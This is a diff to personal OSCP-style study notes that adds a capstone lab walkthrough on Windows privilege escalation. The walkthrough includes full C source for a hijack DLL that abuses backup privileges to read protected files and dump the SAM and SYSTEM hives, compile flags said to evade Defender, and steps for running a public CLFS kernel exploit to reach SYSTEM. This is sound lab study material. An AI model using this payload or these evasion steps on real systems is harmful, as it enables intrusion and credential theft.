@@ -1252,6 +1252,10 @@ Unpatched kernel vulnerabilities can let a user-mode process execute code in the
 3. Check which KB patches the relevant CVE -- if the patch KB isn't in the list, the system is likely vulnerable
 4. Search GitHub/ExploitDB for a compiled PoC
 
+Common examples in OSCP-era labs:
+- **CVE-2023-29360** -- Microsoft Streaming Service Proxy EoP, patched KB5027215; spawns interactive cmd.exe (needs RDP or a command argument)
+- **CVE-2023-28252** -- Windows CLFS driver use-after-free (April 2023 Patch Tuesday); swaps running process token for SYSTEM token in-place; PoC by bkstephen takes `"cmd.exe /c <command>"` argument and writes output to a file; needs write access to `C:\Users\Public\` for working CLFS log files (can fail over WinRM if path ACLs differ)
+
 Example: **CVE-2023-29360** (Microsoft Streaming Service Proxy elevation of privilege, patched in KB5027215):
 ```powershell
 # Verify the patch is absent
@@ -1375,9 +1379,223 @@ C:\Users\steve\Desktop> whoami → nt authority\system
 > 📸 Screenshot: curl output with flag
 
 **Flag (daveadmin's desktop):** `OS{01f9ce50c9d1562bf849831e4049f52b}`
-> 🚩 **Hands-on, VM spin-up required:** Windows Privilege Escalation - Using Exploits VM #3 Capstone (CLIENTWK222, bind shell port 4444) -- full chain, flag at C:\Users\enterpriseadmin\Desktop\flag.txt ⬜ Pending
 
-#### Tags: #KernelExploit #SeImpersonatePrivilege #SigmaPotato #JuicyPotato #Potato #NamedPipes #CVE202329360 #Module17
+---
+
+#### 17.3.2 Capstone: CLIENTWK222 (192.168.137.222)
+
+**Objective:** read `C:\Users\enterpriseadmin\Desktop\flag.txt` starting from the bind shell on port 4444.
+
+**Access provided:**
+- `diana` via nc bind shell port 4444 (a scheduled task runs nc as diana every minute)
+- `alex` via evil-winrm (password: WelcomeToWinter0121)
+
+---
+
+**Step 1: Connect to both shells**
+
+Kali terminal 1 -- diana's bind shell:
+```bash
+nc 192.168.137.222 4444
+```
+Success: `C:\Windows\system32>` as diana. Failure: connection refused (wait 60 seconds for the task to fire, then retry).
+
+Kali terminal 2 -- alex's evil-winrm:
+```bash
+evil-winrm -i 192.168.137.222 -u alex -p WelcomeToWinter0121
+```
+Success: `*Evil-WinRM* PS C:\Users\alex\Documents>`. Failure: connection refused or auth error (wrong creds).
+
+---
+
+**Step 2: Enumerate**
+
+From diana's nc shell:
+```cmd
+whoami /all
+tasklist | findstr /i enterprise
+```
+Key findings: diana is in `BUILTIN\Backup Operators` (SeBackupPrivilege + SeRestorePrivilege). `EnterpriseService.exe` is running.
+
+From alex's evil-winrm:
+```powershell
+dir C:\Services\
+type C:\Services\EnterpriseServiceLog.log
+```
+Key findings: `BUILTIN\Users` has write access to `C:\Services\`. `EnterpriseServiceOptional.dll` is MISSING. The log says `Couldn't load EnterpriseServiceOptional.dll, only using basic features.` This is a DLL hijacking setup -- the service tries to load that DLL from `C:\Services\` at startup.
+
+---
+
+**Step 3: DLL hijack (plant the payload, blocked on trigger)**
+
+The service loads `EnterpriseServiceOptional.dll` at startup only. We have write access to `C:\Services\`. The catch: we can't restart the service without admin rights (sc.exe is access denied, no FailureActions configured, no visible restart task). Plant the DLL anyway so it fires if a restart ever happens, then pivot to the kernel exploit.
+
+On Kali, write the C payload (`/home/kali/backup_payload.c`). The key pieces: enable SeBackupPrivilege on the current token, open the flag file with `FILE_FLAG_BACKUP_SEMANTICS` (bypasses ACLs when backup privilege is active), write it to `C:\Services\result.txt`. Also put the payload in `DllMainCRTStartup` for normal DLL loading and in an exported `OptionalFunction` for cases where the service uses `LOAD_LIBRARY_AS_DATAFILE`:
+
+```c
+#include <windows.h>
+
+void DoPayload(void) {
+    HANDLE hToken;
+    if (!OpenProcessToken(GetCurrentProcess(),
+                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+        return;
+    TOKEN_PRIVILEGES tp; LUID luid;
+    if (LookupPrivilegeValueA(NULL, "SeBackupPrivilege", &luid)) {
+        tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid;
+        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+        AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
+    }
+    if (LookupPrivilegeValueA(NULL, "SeRestorePrivilege", &luid)) {
+        tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid;
+        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+        AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
+    }
+    CloseHandle(hToken);
+
+    HANDLE hIn = CreateFileW(L"C:\\Users\\enterpriseadmin\\Desktop\\flag.txt",
+        GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
+        NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
+    if (hIn != INVALID_HANDLE_VALUE) {
+        char buf[4096]; DWORD got = 0;
+        ReadFile(hIn, buf, sizeof(buf) - 1, &got, NULL);
+        CloseHandle(hIn);
+        HANDLE hOut = CreateFileW(L"C:\\Services\\result.txt",
+            GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hOut != INVALID_HANDLE_VALUE) {
+            DWORD wrote;
+            WriteFile(hOut, buf, got, &wrote, NULL);
+            CloseHandle(hOut);
+        }
+        return;
+    }
+    // fallback: dump SAM/SYSTEM hives
+    HKEY hSam = NULL;
+    RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SAM", REG_OPTION_BACKUP_RESTORE, KEY_READ, &hSam);
+    if (hSam) { RegSaveKeyExW(hSam, L"C:\\Users\\Public\\Documents\\cfg1.db", NULL, REG_NO_COMPRESSION); RegCloseKey(hSam); }
+    HKEY hSys = NULL;
+    RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM", REG_OPTION_BACKUP_RESTORE, KEY_READ, &hSys);
+    if (hSys) { RegSaveKeyExW(hSys, L"C:\\Users\\Public\\Documents\\cfg2.db", NULL, REG_NO_COMPRESSION); RegCloseKey(hSys); }
+}
+
+__declspec(dllexport) void OptionalFunction(void) { DoPayload(); }
+BOOL WINAPI DllMainCRTStartup(HINSTANCE h, DWORD reason, LPVOID r) {
+    if (reason == DLL_PROCESS_ATTACH) DoPayload();
+    return TRUE;
+}
+```
+
+Cross-compile on Kali. The `-nostdlib -nostartfiles` flags strip CRT startup code that Defender flags; the stack probe flags prevent a linker error from the missing `___chkstk_ms` symbol:
+```bash
+x86_64-w64-mingw32-gcc -shared -nostdlib -nostartfiles \
+  -fno-stack-check -mno-stack-arg-probe \
+  -Wl,--entry,DllMainCRTStartup \
+  -o /home/kali/EnterpriseServiceOptional.dll \
+  /home/kali/backup_payload.c \
+  -lkernel32 -ladvapi32
+```
+Success: ~10915-byte DLL. Failure: `undefined reference to ___chkstk_ms` means you forgot `-fno-stack-check -mno-stack-arg-probe`.
+
+Upload from evil-winrm (navigate to C:\Services\ first, or use just the filename so it lands in the current dir):
+```
+cd C:\Services\
+upload /home/kali/EnterpriseServiceOptional.dll EnterpriseServiceOptional.dll
+dir C:\Services\
+```
+Success: DLL shows at ~10915 bytes, not quarantined (nostdlib DLL has no suspicious import patterns for Defender's static scan).
+
+Service never restarts. DLL is planted and ready, but we need another path to trigger it.
+
+> 🔧 **Technique:** DLL hijacking only fires when the service restarts. Methods to trigger: sc.exe (needs SERVICE_STOP/START rights), a scheduled restart task (needs task write access or visibility), crashing with FailureActions (needs those configured), or rebooting (Offsec VMs wipe state on reboot -- [[Offsec VM Stop/Revert both wipe state|both Stop AND Revert reset to clean snapshot]]). If none work, pivot and pursue another path. Plant the DLL anyway so it's ready if a restart happens.
+
+---
+
+**Step 4: Kernel exploit -- CVE-2023-28252 (CLFS use-after-free)**
+
+CVE-2023-28252 is a UAF in the Windows CLFS driver. The bkstephen PoC swaps the running process's token with the SYSTEM token, giving SYSTEM in the current process context. It spawns a child process (or runs a command) with the elevated token.
+
+Create the flag-read batch file from evil-winrm:
+```powershell
+Set-Content -Path "C:\Services\dump.bat" -Value "@echo off`r`ntype C:\Users\enterpriseadmin\Desktop\flag.txt > C:\Services\result.txt"
+```
+Success: dump.bat created at 84 bytes.
+
+Upload the exploit:
+```
+upload /tmp/clfs2/x64/Release/clfs_eop.exe clfs_eop.exe
+dir C:\Services\
+```
+Success: clfs_eop.exe appears at 351232 bytes, not quarantined.
+
+First attempt from alex's evil-winrm:
+```powershell
+.\clfs_eop.exe "cmd.exe /c C:\Services\dump.bat"
+```
+Result: `Could not create LOGfile1, error: 0x5`. The exploit needs to create CLFS working files in `C:\Users\Public\` -- alex's WinRM session doesn't have write access there even though the directory is normally world-writable. WinRM can have tighter path ACLs than interactive sessions.
+
+Switch to diana's nc shell and run it from there:
+```cmd
+C:\Services\clfs_eop.exe "cmd.exe /c C:\Services\dump.bat"
+```
+Success output:
+```
+SYSTEM TOKEN CAPTURED
+ACTUAL USER=SYSTEM
+WE ARE SYSTEM
+```
+
+> 📸 Screenshot: clfs_eop.exe output in diana's nc shell showing SYSTEM TOKEN CAPTURED / ACTUAL USER=SYSTEM
+
+Read the flag:
+```cmd
+type C:\Services\result.txt
+```
+
+> 📸 Screenshot: type output showing OS{} flag value in result.txt
+
+**Flag:** `OS{55a5eb25425fe0875c37038779dc8077}`
+
+```
+whoami (via SYSTEM token swap, not shown directly -- confirmed by exploit output)
+type C:\Services\result.txt
+OS{55a5eb25425fe0875c37038779dc8077}
+```
+
+---
+
+**Full attack chain:**
+
+```mermaid
+flowchart TD
+    A["nc CLIENTWK222 4444\ndiana bind shell"] --> B["Enumerate\nwhoami /all: diana in Backup Operators\ntasklist: EnterpriseService.exe running"]
+    C["evil-winrm as alex\nWelcomeToWinter0121"] --> D["Enumerate C:\\Services\\\nBUILTIN\\Users has Write\nEnterpriseServiceOptional.dll missing"]
+    D --> E["DLL Hijack setup\nCompile nostdlib DLL with SeBackupPrivilege\n+ FILE_FLAG_BACKUP_SEMANTICS payload\nUpload to C:\\Services\\"]
+    E --> F{Service restart trigger?}
+    F -->|"sc.exe / taskkill: access denied\nNo FailureActions\nNo visible restart task"| G["Pivot to kernel exploit"]
+    G --> H["Upload clfs_eop.exe + dump.bat\nto C:\\Services\\ via alex's WinRM"]
+    H --> I["Try from alex WinRM\nclfs_eop.exe 'cmd.exe /c dump.bat'\nERROR: C:\\Users\\Public write denied"]
+    I --> J["Try from diana's nc shell\nC:\\Services\\clfs_eop.exe 'cmd.exe /c dump.bat'"]
+    J --> K["CVE-2023-28252: CLFS UAF\nSYSTEM TOKEN CAPTURED\nWE ARE SYSTEM"]
+    K --> L["dump.bat runs as SYSTEM\ntype flag.txt → result.txt"]
+    L --> M["type C:\\Services\\result.txt\nOS{55a5eb25425fe0875c37038779dc8077}"]
+    style M fill:#2e7d32,color:#fff
+    style I fill:#b71c1c,color:#fff
+```
+
+> 🎬 **[ippsec.rocks: "CVE-2023-28252"](https://ippsec.rocks/?#CVE-2023-28252)** -- search the CLFS exploit; also try "clfs" for boxes where this kernel UAF was the privesc path
+> 🎬 **[ippsec.rocks: "dll hijacking"](https://ippsec.rocks/?#dll%20hijacking)** -- DLL hijacking walkthroughs; "missing dll" for the exact pattern used here (service loads non-existent DLL from a user-writable directory)
+
+> 🔗 **bkstephen CVE-2023-28252 PoC (GitHub):** [github.com/bkstephen/CVE-2023-28252](https://github.com/bkstephen/CVE-2023-28252) -- the specific PoC used; takes one optional argument (the command to run as SYSTEM); hardcodes `C:\Users\Public\` as working directory for CLFS log file creation
+> 🔗 **CVE-2023-28252 NVD entry:** [nvd.nist.gov/vuln/detail/CVE-2023-28252](https://nvd.nist.gov/vuln/detail/CVE-2023-28252) -- patched in April 2023 Patch Tuesday (KB5025221 for Win10 21H2, KB5025224 for Win11 22H2)
+> 🔗 **HackTricks -- Windows Local Privilege Escalation (GitHub):** [github.com/HackTricks-wiki/hacktricks](https://github.com/HackTricks-wiki/hacktricks) -- see "DLL Hijacking" section for full DLL search order breakdown and detection notes
+
+> 🔍 **Worth remembering generally:** WinRM sessions can have tighter filesystem ACLs than interactive shells (nc bind shells, reverse shells, RDP). When a kernel exploit fails with access denied on what should be a world-writable path, try running it from a different user's bind or reverse shell. In this capstone, the exact same exploit binary succeeded from diana's nc shell and failed from alex's WinRM session because `C:\Users\Public` write access differed between those session types.
+
+> 🔍 **Worth remembering generally:** when multiple access paths exist (here: alex via WinRM and diana via bind shell), always test exploit steps from all available sessions. The WinRM shell is not always the most permissive one.
+
+> 🔁 **Similar to:** [[Windows Privilege Escalation#17.3.2. Using Exploits|CVE-2023-29360 workflow in VM#1]] -- same class of kernel exploit (pre-compiled PoC, SYSTEM token swap). Same lesson: if the exploit spawns an interactive process without a command argument, it won't show up over WinRM or nc. Always pass `cmd.exe /c <command>` and write output to a file.
+
+#### Tags: #KernelExploit #SeImpersonatePrivilege #SigmaPotato #JuicyPotato #Potato #NamedPipes #CVE202329360 #CVE202328252 #CLFS #DLLHijack #SeBackupPrivilege #BackupOperators #MinGW #Capstone #Module17
 
 ---
 
@@ -1462,7 +1680,7 @@ flowchart TD
 - [x] **17.2.2 DLL Hijacking:** done (DLL search order diagram, Process Monitor workflow, DllMain template, missing DLL detection, --shared compile)
 - [x] **17.2.3 Unquoted Service Paths:** done (path resolution sequence diagram, wmic command, icacls check, PowerUp Get-UnquotedService + Write-ServiceBinary; VM#1 flag OS{0b3c0403ab9fc3ba56de4bea2fcd8634} — SYSTEM via steve's explicit SDDL start rights + UAC token filtering lesson; VM#2 flag OS{ec55ff1679fdca9cd15a087e725dd394} — shell as roy)
 - [x] **17.3.1 Scheduled Tasks:** done (three key questions, schtasks enumeration, binary replacement attack, timing considerations)
-- [x] **17.3.2 Using Exploits:** done (three exploit categories, CVE-2023-29360 workflow, SeImpersonatePrivilege + named pipes architecture, SigmaPotato usage, Potato family overview)
+- [x] **17.3.2 Using Exploits:** done (three exploit categories, CVE-2023-29360 workflow, SeImpersonatePrivilege + named pipes architecture, SigmaPotato usage, Potato family overview; Capstone CLIENTWK222 flag OS{55a5eb25425fe0875c37038779dc8077} -- CVE-2023-28252 CLFS from diana's nc shell, DLL planted but no restart trigger found)
 - [x] **17.4 Wrapping Up:** done (full decision flowchart, external resources, related boxes)
 
-**Module 17 theory and quiz answers fully written. Labs done so far: 17.1.1 quiz, 17.1.2 VM#1+VM#2, 17.1.3 VM#1+VM#2, 17.1.4 VM#1+VM#2, 17.1.5 VM#1, 17.2.1 VM#1+VM#2, 17.2.2 VM#1, 17.2.3 VM#1+VM#2, 17.3.1 VM#1+VM#2, 17.3.2 VM#1+VM#2. Remaining labs: Capstone (CLIENTWK222).**
+**Module 17 fully complete as of 2026-08-15. All theory, quiz answers, and hands-on labs done: 17.1.1 quiz, 17.1.2 VM#1+VM#2, 17.1.3 VM#1+VM#2, 17.1.4 VM#1+VM#2, 17.1.5 VM#1, 17.2.1 VM#1+VM#2, 17.2.2 VM#1, 17.2.3 VM#1+VM#2, 17.3.1 VM#1+VM#2, 17.3.2 VM#1+VM#2+Capstone. Solo enrichment pass done 2026-08-14. Hub-doc sync done 2026-08-15.**
